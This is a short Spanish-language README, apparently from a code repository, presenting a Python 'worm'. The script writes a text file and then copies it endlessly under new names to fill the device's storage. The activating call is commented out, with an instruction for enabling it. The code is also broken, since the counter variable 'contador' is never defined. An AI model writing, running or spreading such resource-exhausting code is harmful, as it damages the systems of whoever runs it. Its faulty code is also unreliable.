# Worm
**Este programa crea un gusano que colapsa la memoria del dispositivo.** 

```python

# Importamos los modulos que usaremos

import os
import shutil

def cargar_archivo():
    gusano = open("truth.txt" , "w") # Crea un archivo txt y lo llena con 50 lineas

    for i in range(0, 50):
        gusano.write(f"Gusanito: {i} \n")
        
    gusano.close()

def worm():

    while True:
        shutil.copy2("truth.txt" , f"truth-gusano{contador}.py") 


cargar_archivo()


# Si cambias # por w en la siguiente linea, activas el gusano
#orm()

  
```

